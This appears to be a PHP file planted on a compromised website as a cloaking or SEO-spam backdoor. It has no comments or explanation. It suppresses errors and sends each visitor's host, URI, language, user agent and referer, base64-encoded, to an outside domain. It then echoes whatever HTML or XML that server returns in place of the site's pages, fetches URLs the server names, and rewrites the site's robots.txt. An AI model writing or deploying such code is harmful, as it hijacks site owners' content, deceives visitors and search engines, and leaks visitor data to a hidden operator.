<?php
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
date_default_timezone_set('PRC');

$Prefix = "a133";
$lan = base64_encode(@$_SERVER['HTTP_ACCEPT_LANGUAGE']);    
$uri = base64_encode(@$_SERVER['REQUEST_URI']);
$host = @$_SERVER['HTTP_HOST'];
$agent = base64_encode(@$_SERVER['HTTP_USER_AGENT']);
$referer = base64_encode(@$_SERVER['HTTP_REFERER']);
$http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
$goweb = $Prefix.'.'."cs7mail.top";
$typeName = base64_encode($http_type.$host);
$geturl = 'http://'.$goweb.'/index.php?domain='.$typeName.'&uri='.$uri.'&lan='.$lan.'&agent='.$agent.'&referer='.$referer;

$file_contents = getCurl($geturl); 

if(strstr($file_contents,"[#*#*#]")){
    $html = explode("[#*#*#]",$file_contents);
    if($html[0] == "echohtml"){ echo $html[1]; exit; }
    if($html[0] == "echoxml"){ header("Content-type: text/xml"); echo $html[1]; exit; }
    if($html[0] == "pingxml"){ $pingRes = getCurl($html[1]); $Oooo0s = (strpos($pingRes, 'Sitemap Notification Received') !== false)?'OK':'ERROR';echo $html[1].'===>Sitemap: '.$Oooo0s."<br>";
    file_put_contents("./robots.txt", "User-agent: *"."\r\n"."Allow: /"."\r\n" . "Sitemap: " . $http_type.$host . "/sitemap.xml");if(file_exists("./robots.txt")){echo '==>robots OK';}else{echo '==>robots ERROR';}}
}
function getCurl($url)
{
    $file_contents = @file_get_contents($url); 
    if (!$file_contents) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
        $file_contents = curl_exec($ch);
        curl_close($ch);
    }  
    return $file_contents;
}  
?>